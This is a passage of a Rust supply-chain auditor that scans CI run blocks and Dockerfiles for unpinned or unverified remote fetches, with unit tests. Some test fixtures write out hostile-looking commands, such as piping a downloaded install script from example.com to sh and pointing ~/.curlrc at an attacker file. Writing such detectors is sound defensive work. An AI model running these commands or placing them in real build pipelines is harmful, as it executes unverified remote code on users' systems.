            escaped = true;
            continue;
        }
        if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
            continue;
        }
        if quote.is_some() {
            continue;
        }
        match character {
            '{' => depth += 1,
            '}' => depth = depth.saturating_sub(1),
            _ => {}
        }
    }
    depth
}

fn code_segments(line: &str) -> Vec<&str> {
    let mut segments = Vec::new();
    let mut start = 0;
    let mut quote = None;
    let mut escaped = false;
    for (index, character) in line.char_indices() {
        if escaped {
            escaped = false;
        } else if character == '\\' && quote.is_some() {
            escaped = true;
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else if quote.is_none() {
                Some(character)
            } else {
                quote
            };
        } else if character == ';' && quote.is_none() {
            let segment = line[start..index].trim();
            if !segment.is_empty() {
                segments.push(segment);
            }
            start = index + 1;
        }
    }
    let segment = line[start..].trim();
    if !segment.is_empty() {
        segments.push(segment);
    }
    segments
}

fn exact_static_url(value: &str) -> Option<String> {
    let quote = value
        .chars()
        .next()
        .filter(|c| matches!(c, '\'' | '"' | '`'))?;
    let body = &value[quote.len_utf8()..];
    let end = closing_quote(body, quote)?;
    let literal = &body[..end];
    let trailing = body[end + quote.len_utf8()..].trim_start();
    if !trailing_is_comment(trailing) || literal.contains("${") {
        return None;
    }
    let decoded = decode_javascript_url_literal(literal)?;
    (decoded.starts_with("https://") || decoded.starts_with("http://")).then_some(decoded)
}

fn decode_javascript_url_literal(literal: &str) -> Option<String> {
    let mut decoded = String::with_capacity(literal.len());
    let mut chars = literal.chars();
    while let Some(character) = chars.next() {
        if character != '\\' {
            decoded.push(character);
            continue;
        }
        let escaped = chars.next()?;
        match escaped {
            'x' => {
                let digits: String = chars.by_ref().take(2).collect();
                if digits.len() != 2 {
                    return None;
                }
                decoded.push(char::from(u8::from_str_radix(&digits, 16).ok()?));
            }
            'u' => {
                let digits = if chars.clone().next() == Some('{') {
                    chars.next();
                    let mut digits = String::new();
                    loop {
                        let character = chars.next()?;
                        if character == '}' {
                            break;
                        }
                        if digits.len() == 6 || !character.is_ascii_hexdigit() {
                            return None;
                        }
                        digits.push(character);
                    }
                    if digits.is_empty() {
                        return None;
                    }
                    digits
                } else {
                    let digits: String = chars.by_ref().take(4).collect();
                    if digits.len() != 4 {
                        return None;
                    }
                    digits
                };
                decoded.push(char::from_u32(u32::from_str_radix(&digits, 16).ok()?)?);
            }
            '\\' | '/' | '\'' | '"' | '`' => decoded.push(escaped),
            'n' => decoded.push('\n'),
            'r' => decoded.push('\r'),
            't' => decoded.push('\t'),
            'b' => decoded.push('\u{0008}'),
            'f' => decoded.push('\u{000c}'),
            'v' => decoded.push('\u{000b}'),
            '0' => decoded.push('\0'),
            '\n' | '\r' => {}
            other => decoded.push(other),
        }
    }
    Some(decoded)
}

fn exact_identifier(value: &str) -> Option<&str> {
    let end = value
        .find(|c: char| c != '_' && c != '$' && !c.is_ascii_alphanumeric())
        .unwrap_or(value.len());
    let identifier = &value[..end];
    if identifier.is_empty()
        || identifier.as_bytes()[0].is_ascii_digit()
        || !trailing_is_comment(value[end..].trim_start())
    {
        return None;
    }
    Some(identifier)
}

fn trailing_is_comment(value: &str) -> bool {
    value.is_empty() || value.starts_with("//") || value.starts_with('#')
}

fn closing_quote(value: &str, quote: char) -> Option<usize> {
    let mut escaped = false;
    for (index, character) in value.char_indices() {
        if escaped {
            escaped = false;
        } else if character == '\\' {
            escaped = true;
        } else if character == quote {
            return Some(index);
        }
    }
    None
}

#[allow(clippy::too_many_arguments)]
fn scan_indirect_url_sink(
    line: &str,
    line_num: usize,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
    bindings: &HashMap<String, String>,
    markers: &[&str],
    patterns: &[Pattern],
    category: audit_patterns::Category,
    language: &str,
    report_unresolved: bool,
) {
    let mut sinks: Vec<(usize, usize)> = markers
        .iter()
        .flat_map(|marker| {
            line.match_indices(marker).filter_map(move |(index, _)| {
                sink_argument_start(line, marker, index).map(|start| (index, start))
            })
        })
        .collect();
    sinks.sort_unstable_by_key(|(index, _)| *index);

    for (sink_index, start) in sinks {
        let argument = line[start..]
            .trim_start_matches(|character: char| character.is_whitespace() || character == '(');
        if let Some(url) = static_concatenated_sink_url(argument) {
            if url.starts_with("https://") || url.starts_with("http://") {
                let synthetic = if language == "Python" {
                    format!("requests.get(\"{url}\")")
                } else {
                    format!("fetch(\"{url}\")")
                };
                let before = collector.findings.len();
                match language {
                    "JavaScript" => check_patterns(
                        &JS_PATTERNS,
                        &synthetic,
                        source_file,
                        line_num,
                        action_name,
                        collector,
                    ),
                    "Python" => check_patterns(
                        &PY_PATTERNS,
                        &synthetic,
                        source_file,
                        line_num,
                        action_name,
                        collector,
                    ),
                    _ => {}
                }
                if collector.findings.len() == before {
                    check_url_patterns(
                        patterns,
                        &synthetic,
                        source_file,
                        line_num,
                        action_name,
                        collector,
                        config,
                    );
                }
                if collector.findings.len() > before
                    && let Some(finding) = collector.findings.last_mut()
                {
                    finding.pattern_matched = line.trim().to_string();
                    finding.description = format!(
                        "{language} runtime fetch uses a statically concatenated external URL without version pinning"
                    );
                }
            }
            continue;
        }
        if let Some(literal) = static_sink_literal(argument) {
            if !(literal.starts_with("https://") || literal.starts_with("http://"))
                && let Some(decoded) = decode_javascript_url_literal(literal)
                && (decoded.starts_with("https://") || decoded.starts_with("http://"))
            {
                let synthetic = if language == "Python" {
                    format!("requests.get(\"{decoded}\")")
                } else {
                    format!("fetch(\"{decoded}\")")
                };
                let before = collector.findings.len();
                match language {
                    "JavaScript" => check_patterns(
                        &JS_PATTERNS,
                        &synthetic,
                        source_file,
                        line_num,
                        action_name,
                        collector,
                    ),
                    "Python" => check_patterns(
                        &PY_PATTERNS,
                        &synthetic,
                        source_file,
                        line_num,
                        action_name,
                        collector,
                    ),
                    _ => {}
                }
                if collector.findings.len() == before {
                    check_url_patterns(
                        patterns,
                        &synthetic,
                        source_file,
                        line_num,
                        action_name,
                        collector,
                        config,
                    );
                }
                if collector.findings.len() > before
                    && let Some(finding) = collector.findings.last_mut()
                {
                    finding.pattern_matched = line.trim().to_string();
                    finding.description = format!(
                        "{language} runtime fetch uses an escaped external URL without version pinning"
                    );
                }
            }
            continue;
        }
        if argument.starts_with(['\'', '"', '`'])
            && (patterns
                .iter()
                .any(|pattern| pattern.regex.is_match(&line[sink_index..]))
                || match language {
                    "JavaScript" => JS_PATTERNS
                        .iter()
                        .any(|pattern| pattern.regex.is_match(&line[sink_index..])),
                    "Python" => PY_PATTERNS
                        .iter()
                        .any(|pattern| pattern.regex.is_match(&line[sink_index..])),
                    _ => false,
                })
        {
            continue;
        }
        let name: String = argument
            .chars()
            .take_while(|c| *c == '_' || *c == '$' || c.is_ascii_alphanumeric())
            .collect();
        if name.is_empty() {
            if !report_unresolved {
                continue;
            }
            collector.push_finding(AuditFinding::new(
                &audit_patterns::Severity::Medium,
                &category,
                action_name,
                source_file,
                line_num,
                line,
                format!(
                    "{language} runtime fetch URL is non-literal and could not be verified statically"
                ),
            ));
            continue;
        }
        if let Some(url) = bindings.get(&name) {
            let synthetic = if language == "Python" {
                format!("requests.get(\"{url}\")")
            } else {
                format!("fetch(\"{url}\")")
            };
            let before = collector.findings.len();
            match language {
                "JavaScript" => check_patterns(
                    &JS_PATTERNS,
                    &synthetic,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                ),
                "Python" => check_patterns(
                    &PY_PATTERNS,
                    &synthetic,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                ),
                _ => {}
            }
            if collector.findings.len() == before {
                check_url_patterns(
                    patterns,
                    &synthetic,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                    config,
                );
            }
            if collector.findings.len() > before
                && let Some(finding) = collector.findings.last_mut()
            {
                finding.pattern_matched = line.trim().to_string();
                finding.description = format!(
                    "{} runtime fetch uses `{name}`, bound to an external URL without version pinning",
                    language
                );
            }
        } else {
            if !report_unresolved {
                continue;
            }
            collector.push_finding(AuditFinding::new(
                &audit_patterns::Severity::Medium,
                &category,
                action_name,
                source_file,
                line_num,
                line,
                format!(
                    "{language} runtime fetch URL is non-literal and could not be verified statically"
                ),
            ));
        }
    }
}

fn sink_argument_start(line: &str, marker: &str, index: usize) -> Option<usize> {
    let boundary = line[..index].chars().next_back();
    let prefix = line[..index].trim_end();
    let valid_boundary = boundary.is_none_or(|c| {
        c == '.' && marker == "fetch"
            || c != '.' && c != '_' && c != '$' && !c.is_ascii_alphanumeric()
    });
    if !valid_boundary || javascript_position_is_quoted(line, index) || prefix.ends_with("function")
    {
        return None;
    }

    let mut offset = index + marker.len();
    loop {
        let remaining = &line[offset..];
        let trimmed = remaining.trim_start();
        offset += remaining.len() - trimmed.len();
        if let Some(comment) = line[offset..].strip_prefix("/*") {
            let end = comment.find("*/")?;
            offset += 2 + end + 2;
            continue;
        }
        return line[offset..].starts_with('(').then_some(offset + 1);
    }
}

pub(crate) fn javascript_position_is_quoted(line: &str, position: usize) -> bool {
    let mut quote = None;
    let mut escaped = false;
    let mut template_expressions: Vec<usize> = Vec::new();
    let mut characters = line[..position].chars().peekable();
    while let Some(character) = characters.next() {
        if escaped {
            escaped = false;
        } else if character == '\\' && quote.is_some() {
            escaped = true;
        } else if quote == Some('`') && character == '$' && characters.peek() == Some(&'{') {
            characters.next();
            quote = None;
            template_expressions.push(1);
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else if quote.is_none() {
                Some(character)
            } else {
                quote
            };
        } else if quote.is_none()
            && let Some(depth) = template_expressions.last_mut()
        {
            if character == '{' {
                *depth += 1;
            } else if character == '}' {
                *depth -= 1;
                if *depth == 0 {
                    template_expressions.pop();
                    quote = Some('`');
                }
            }
        }
    }
    quote.is_some()
}

fn static_sink_literal(argument: &str) -> Option<&str> {
    let quote = argument
        .chars()
        .next()
        .filter(|c| matches!(c, '\'' | '"' | '`'))?;
    let body = &argument[quote.len_utf8()..];
    let end = closing_quote(body, quote)?;
    if quote == '`' && body[..end].contains("${") {
        return None;
    }
    let trailing = body[end + quote.len_utf8()..].trim_start();
    (trailing.starts_with(')') || trailing.starts_with(',')).then_some(&body[..end])
}

fn static_concatenated_sink_url(argument: &str) -> Option<String> {
    let mut remaining = argument.trim_start();
    let mut joined = String::new();
    let mut literals = 0usize;
    loop {
        let quote = remaining
            .chars()
            .next()
            .filter(|character| matches!(character, '\'' | '"' | '`'))?;
        let body = &remaining[quote.len_utf8()..];
        let end = closing_quote(body, quote)?;
        let literal = &body[..end];
        if quote == '`' && literal.contains("${") {
            return None;
        }
        joined.push_str(&decode_javascript_url_literal(literal)?);
        literals += 1;
        remaining = body[end + quote.len_utf8()..].trim_start();

        if let Some(next) = remaining.strip_prefix('+') {
            remaining = next.trim_start();
            continue;
        }
        if remaining.starts_with(['\'', '"', '`']) {
            continue;
        }
        return (literals > 1 && (remaining.starts_with(')') || remaining.starts_with(',')))
            .then_some(joined);
    }
}

pub(crate) fn scan_dockerfile_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // Dockerfile RUN instructions lean heavily on trailing-backslash
    // continuations; scan logical lines so a fetch split across physical
    // lines is still seen whole.
    let logical = join_continuations(content);

    // Multi-stage builds name stages via `FROM … AS <name>`. Collect those
    // names so a later `FROM <name>` is recognized as a stage reference, not an
    // image pull — otherwise it false-positives as an untagged image.
    let stage_names: HashSet<String> = logical
        .iter()
        .filter_map(|(_, line)| audit_patterns::dockerfile_stage_alias(line))
        .collect();

    // Escalate `RUN curl ... | sh` from medium (DOCKER_RUN_CURL) to high.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, line) in &logical {
        let line_num = start + 1;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    for (li, (start, line)) in logical.iter().enumerate() {
        let line = line.as_str();
        let line_num = start + 1;

        if audit_patterns::DOCKER_FROM_DIGEST.is_match(line) {
            continue;
        }
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }
        // `FROM <stage>` (an earlier build stage) and `FROM scratch` (the empty
        // base) are not unpinned image pulls — there's nothing to pin.
        if let Some(base) = audit_patterns::dockerfile_from_base(line)
            && (base == "scratch" || stage_names.contains(&base))
        {
            continue;
        }

        check_patterns(
            &DOCKER_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );

        check_url_patterns(
            &DOCKER_URL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            if git_clone_has_bound_sha_checkout(&logical, li) {
                collector.push_allowed(AuditMatch::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::DockerUnpinned,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "followed by SHA checkout",
                ));
            } else {
                collector.push_finding(AuditFinding::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::DockerUnpinned,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "git clone in Dockerfile without pinned ref",
                ));
            }
        }
    }
}

enum NonLiteralFetch {
    None,
    Finding,
    ExtraDataFormat,
}

fn classify_non_literal_executable(line: &str, config: &Config) -> NonLiteralFetch {
    if extract_urls(line).next().is_some() || !line.contains('$') {
        return NonLiteralFetch::None;
    }
    let mut extra_data_format = false;
    for target in fetch_output_targets(line) {
        if target.contains('$') || target == "/dev/null" {
            continue;
        }
        if config.is_extra_data_format_exempt(&target) {
            extra_data_format = true;
        } else if !config.is_data_format_exempt(&target) {
            return NonLiteralFetch::Finding;
        }
    }
    if extra_data_format {
        NonLiteralFetch::ExtraDataFormat
    } else {
        NonLiteralFetch::None
    }
}

fn push_pkg_finding(
    rule: &PkgRule,
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    collector.push_finding(AuditFinding::new(
        &rule.severity,
        &audit_patterns::Category::ShellFetch,
        action_name,
        source_file,
        line_num,
        line,
        rule.description,
    ));
}

fn check_url_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // The URL classification below is line-level, so every matching pattern
    // would reach the identical verdict on the identical URL set: record once
    // for the first match instead of once per pattern (`curl … && wget …`
    // previously emitted two findings for the same line).
    let Some(pattern) = patterns.iter().find(|p| p.regex.is_match(line)) else {
        return;
    };

    // Check EVERY URL, not just the first: a versioned/trusted decoy before
    // the real fetch must not suppress the finding. Allowed only if all URLs
    // are exempt; any unexempt one is a finding.
    let mut allowed_reason: Option<&str> = None;
    let mut dangerous = false;
    for url in extract_urls(line) {
        if url_has_version(url) {
            allowed_reason.get_or_insert("versioned URL");
        } else if config.is_host_trusted(url) {
            allowed_reason.get_or_insert(REASON_TRUSTED_HOST);
        } else if config.is_extra_data_format_exempt(url) {
            allowed_reason.get_or_insert(REASON_EXTRA_DATA_FORMAT);
        } else if config.is_data_format_exempt(url) {
            allowed_reason.get_or_insert("data format URL");
        } else if url_piped_to_jq(line, url) {
            allowed_reason.get_or_insert("piped to jq");
        } else {
            dangerous = true;
            break;
        }
    }

    if dangerous {
        if let Some(reason) = allowed_reason {
            collector.push_allowed(AuditMatch::from_pattern(
                pattern,
                action_name,
                source_file,
                line_num,
                line,
                reason,
            ));
        }
        collector.push_finding(AuditFinding::from_pattern(
            pattern,
            action_name,
            source_file,
            line_num,
            line,
        ));
    } else if let Some(reason) = allowed_reason {
        collector.push_allowed(AuditMatch::from_pattern(
            pattern,
            action_name,
            source_file,
            line_num,
            line,
            reason,
        ));
    }
    // No URL on the line: nothing to record.
}

fn check_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    for pattern in patterns {
        if pattern.regex.is_match(line) {
            collector.push_finding(AuditFinding::from_pattern(
                pattern,
                action_name,
                source_file,
                line_num,
                line,
            ));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::LazyLock;

    static DEFAULT_CONFIG: LazyLock<Config> = LazyLock::new(Config::default);

    #[test]
    fn collector_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        c.push_allowed(AuditMatch::new(
            &audit_patterns::Severity::Medium,
            &audit_patterns::Category::ShellFetch,
            "",
            "test",
            1,
            "curl https://example.com/v1.2.3/foo",
            "versioned URL",
        ));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn collector_keeps_allowed_when_verbose() {
        let mut c = AuditCollector::new(true);
        c.push_allowed(AuditMatch::new(
            &audit_patterns::Severity::Medium,
            &audit_patterns::Category::ShellFetch,
            "",
            "test",
            1,
            "curl https://example.com/v1.2.3/foo",
            "versioned URL",
        ));
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn find_run_line_advances_past_earlier_match() {
        // Two `run:` blocks both start with `echo hello`. The second one must
        // map to its own line, not the first occurrence, so checksum-suppression
        // windows and SARIF locations stay anchored correctly.
        let yaml = "\
jobs:
  a:
    steps:
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
";
        let (first, cursor) = find_run_line(yaml, "echo hello\n          curl ...", 0);
        assert_eq!(first, 5, "first block should anchor at line 5");
        let (second, _) = find_run_line(yaml, "echo hello\n          curl ...", cursor);
        assert_eq!(
            second, 8,
            "second block must skip the first block's first-line match"
        );
    }

    #[test]
    fn find_run_line_advances_past_the_previous_block_body() {
        let yaml = "\
jobs:
  a:
    steps:
      - run: |
          echo first
          echo shared
      - run: |
          echo shared
          echo second
";
        let (first, cursor) = find_run_line(yaml, "echo first\necho shared", 0);
        assert_eq!(first, 5);
        let (second, _) = find_run_line(yaml, "echo shared\necho second", cursor);
        assert_eq!(second, 8);
    }

    #[test]
    fn find_run_line_empty_run_content() {
        let (line, cursor) = find_run_line("foo\nbar\n", "", 0);
        assert_eq!((line, cursor), (0, 0));
    }

    #[test]
    fn find_run_line_no_match_preserves_cursor() {
        let (line, cursor) = find_run_line("foo\nbar\n", "baz", 1);
        assert_eq!((line, cursor), (0, 1));
    }

    #[test]
    fn find_run_line_prefers_exact_trimmed_match() {
        // A longer line that `contains` the target shouldn't steal the
        // anchor from the actual run block's first line further down.
        let file = "\
prefix echo hello world
    echo hello
more stuff
";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (2, 2));
    }

    #[test]
    fn find_run_line_falls_back_to_contains() {
        // No exact trimmed match exists, so `contains` still anchors.
        let file = "echo hello world\nother\n";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (1, 1));
    }

    #[test]
    fn extract_run_blocks_recurses_into_parallel_steps() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo outside
      - parallel:
          - run: echo nested one
          - name: Nested two
            run: |
              echo nested two
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let runs = blocks.iter().map(|(_, run)| run.trim()).collect::<Vec<_>>();

        assert_eq!(
            runs,
            vec!["echo outside", "echo nested one", "echo nested two"]
        );
    }

    #[test]
    fn extract_run_blocks_anchors_nested_parallel_blocks_in_document_order() {
        let yaml = "\
jobs:
  test:
    steps:
      - run: |
          echo shared
          echo first
      - parallel:
          - run: |
              echo shared
              echo nested
      - run: |
          echo shared
          echo third
";
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let lines = blocks.iter().map(|(line, _run)| *line).collect::<Vec<_>>();

        assert_eq!(lines, vec![5, 9, 12]);
    }

    #[test]
    fn extract_job_run_blocks_preserves_working_directory_precedence() {
        let yaml = r#"
defaults:
  run:
    working-directory: workflow
jobs:
  first:
    defaults:
      run:
        working-directory: job
    steps:
      - run: echo job
      - working-directory: step
        run: echo step
  second:
    steps:
      - run: echo workflow
"#;
        let jobs = extract_job_run_blocks(Path::new("workflow.yml"), yaml).unwrap();

        assert_eq!(jobs.len(), 2);
        assert_eq!(jobs[0][0].working_directory.as_deref(), Some("job"));
        assert_eq!(jobs[0][1].working_directory.as_deref(), Some("step"));
        assert_eq!(jobs[1][0].working_directory.as_deref(), Some("workflow"));
    }

    #[test]
    fn shell_state_crosses_steps_within_a_job_but_not_job_boundaries() {
        let yaml = r#"
jobs:
  first:
    steps:
      - run: curl -o tool.sig https://example.com/v1.2.3/tool.sig
      - run: |
          curl -o tool https://example.com/tool
          gpg --verify tool.sig tool
  second:
    steps:
      - run: curl -o other.sig https://example.com/v1.2.3/other.sig
  third:
    steps:
      - run: |
          curl -o other https://example.com/other
          gpg --verify other.sig other
"#;
        let jobs = extract_job_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for blocks in jobs {
            let mut state = ShellScanState::default();
            for block in blocks {
                scan_shell_content_with_state(
                    &block.content,
                    "workflow.yml",
                    block.line,
                    "",
                    &mut c,
                    &DEFAULT_CONFIG,
                    &mut state,
                );
            }
        }

        assert_eq!(c.findings.len(), 1);
        assert_eq!(
            c.findings[0].pattern_matched,
            "curl -o tool https://example.com/tool"
        );
    }

    #[test]
    fn shell_state_carries_config_and_runtime_key_taint_between_steps() {
        for (first_step, second_step) in [
            (
                "ln -sf attacker.rc ~/.curlrc",
                "curl https://example.com/v1.2.3/tool.sig\ncurl -q -o tool https://example.com/tool\ngpg --verify tool.sig tool",
            ),
            (
                "curl -o key.asc https://example.com/v1.2.3/key.asc\ngpg --import key.asc",
                "curl -q -o tool https://example.com/tool\ngpg --verify committed.sig tool",
            ),
        ] {
            let mut c = AuditCollector::new(false);
            let mut state = ShellScanState::default();
            scan_shell_content_with_state(
                first_step,
                "workflow.yml",
                1,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );
            scan_shell_content_with_state(
                second_step,
                "workflow.yml",
                2,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );

            assert_eq!(c.findings.len(), 1, "first step: {first_step}");
        }
    }

    #[test]
    fn shell_state_preserves_inline_digest_and_completed_verification() {
        let digest = "a".repeat(64);
        let mut c = AuditCollector::new(false);
        let mut state = ShellScanState::default();
        scan_shell_content_with_state(
            "curl -o key.asc https://example.com/v1.2.3/key.asc\ngpg --import key.asc",
            "workflow.yml",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );
        scan_shell_content_with_state(
            &format!(
                "curl -o tool https://example.com/tool\necho '{digest}  tool' | shasum -a 256 -c -"
            ),
            "workflow.yml",
            3,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );
        scan_shell_content_with_state(
            "curl -K runtime.conf https://example.com/v1.2.3/later",
            "workflow.yml",
            5,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );

        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_state_does_not_carry_step_local_wget_environment() {
        let mut c = AuditCollector::new(false);
        let mut state = ShellScanState::default();
        scan_shell_content_with_state(
            "export WGETRC=./runtime.wgetrc",
            "workflow.yml",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );
        scan_shell_content_with_state(
            "wget -O tool https://example.com/tool\ngpg --verify committed.sig tool",
            "workflow.yml",
            2,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );

        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_state_orders_same_line_artifact_transfers() {
        for (setup, expected_findings) in [
            (
                "mv committed.sig trusted.sig && curl -o committed.sig https://example.com/v1.2.3/committed.sig",
                0,
            ),
            (
                "curl -o downloaded.sig https://example.com/v1.2.3/downloaded.sig && mv downloaded.sig trusted.sig",
                1,
            ),
        ] {
            let mut c = AuditCollector::new(false);
            let mut state = ShellScanState::default();
            scan_shell_content_with_state(
                setup,
                "workflow.yml",
                1,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );
            scan_shell_content_with_state(
                "curl -o tool https://example.com/tool\ngpg --verify trusted.sig tool",
                "workflow.yml",
                2,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );

            assert_eq!(c.findings.len(), expected_findings, "setup: {setup}");
        }
    }

    #[test]
    fn shell_state_tracks_or_taints_inline_directory_changes() {
        for setup in [
            "mkdir -p dl && cd dl && curl -o tool.sig https://example.com/v1.2.3/tool.sig",
            "mkdir -p dl\ncd dl\ncurl -o tool.sig https://example.com/v1.2.3/tool.sig",
            "mkdir -p dl && (cd dl && curl -o tool.sig https://example.com/v1.2.3/tool.sig)",
            "mkdir -p dl\npushd dl\ncurl -o tool.sig https://example.com/v1.2.3/tool.sig\npopd",
            "cd \"$RUNTIME_DIR\" && curl -o tool.sig https://example.com/v1.2.3/tool.sig",
        ] {
            let mut c = AuditCollector::new(false);
            let mut state = ShellScanState::default();
            scan_shell_content_with_state(
                setup,
                "workflow.yml",
                1,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );
            scan_shell_content_with_state(
                "curl -o tool https://example.com/tool\ngpg --verify dl/tool.sig tool",
                "workflow.yml",
                2,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );

            assert_eq!(c.findings.len(), 1, "setup: {setup}");
        }
    }

    #[test]
    fn shell_directory_state_binds_the_payload_and_resets_between_steps() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "mkdir -p dl\ncd dl\ncurl -o tool https://example.com/tool\ngpg --verify ../trusted.sig tool",
            "workflow.yml",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());

        scan_shell_content(
            "curl -o tool https://example.com/tool\ncd dl\ngpg --verify ../trusted.sig tool",
            "workflow.yml",
            5,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);

        let mut state = ShellScanState::default();
        scan_shell_content_with_state(
            "cd dl",
            "workflow.yml",
            8,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );
        scan_shell_content_with_state(
            "curl -o reset https://example.com/reset\ngpg --verify trusted.sig reset",
            "workflow.yml",
            9,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_directory_state_is_ordered_within_a_logical_line() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -o wrong https://example.com/wrong && cd dl && gpg --verify ../trusted.sig wrong",
            "workflow.yml",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);

        scan_shell_content(
            "cd dl && curl -o right https://example.com/right && gpg --verify ../trusted.sig right",
            "workflow.yml",
            2,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);

        scan_shell_content(
            "curl -o completed https://example.com/completed && gpg --verify trusted.sig completed && cd dl",
            "workflow.yml",
            3,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_path_binding_review_variants_fail_closed() {
        for (setup, signature) in [
            (
                "mkdir -p dl\nif cd dl; then curl -o tool.sig https://example.com/v1.2.3/tool.sig; fi\ncd ..",
                "dl/tool.sig",
            ),
            (
                "mkdir -p dl\nSet-Location dl\ncurl -o tool.sig https://example.com/v1.2.3/tool.sig\nSet-Location ..",
                "dl/tool.sig",
            ),
            (
                "mkdir -p dl\ncurl -o dl/tool.sig https://example.com/v1.2.3/tool.sig\nln -s dl alias",
                "alias/tool.sig",
            ),
        ] {
            let mut c = AuditCollector::new(false);
            let mut state = ShellScanState::default();
            scan_shell_content_with_state(
                setup,
                "workflow.yml",
                1,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );
            scan_shell_content_with_state(
                &format!("curl -o tool https://example.com/tool\ngpg --verify {signature} tool"),
                "workflow.yml",
                5,
                "",
                &mut c,
                &DEFAULT_CONFIG,
                &mut state,
            );

            assert_eq!(c.findings.len(), 1, "setup: {setup}");
        }

        for verification in [
            "gpg --verify <(curl https://example.com/v1.2.3/tool.sig) tool",
            "gpg --verify /dev/stdin tool <tool.sig",
            "! gpg --verify trusted.sig tool",
            "sha256sum -c tool",
        ] {
            let mut c = AuditCollector::new(false);
            scan_shell_content(
                &format!("curl -o tool https://example.com/tool\n{verification}"),
                "workflow.yml",
                1,
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert_eq!(c.findings.len(), 1, "verification: {verification}");
        }

        let mut c = AuditCollector::new(false);
        let mut state = ShellScanState::default();
        scan_shell_content_with_state(
            "curl -o key.asc https://example.com/v1.2.3/key.asc\ncommand gpg --import key.asc",
            "workflow.yml",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );
        scan_shell_content_with_state(
            "curl -o tool https://example.com/tool\ngpg --verify trusted.sig tool",
            "workflow.yml",
            3,
            "",
            &mut c,
            &DEFAULT_CONFIG,
            &mut state,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn absolute_directory_change_recovers_static_path_binding() {
        let digest = "a".repeat(64);
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            &format!(
                "cd \"$RUNNER_TEMP\"\ncd /tmp\ncurl -o tool https://example.com/tool\necho '{digest}  tool' | sha256sum -c -"
            ),
            "workflow.yml",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );

        assert!(c.findings.is_empty());
    }

    #[test]
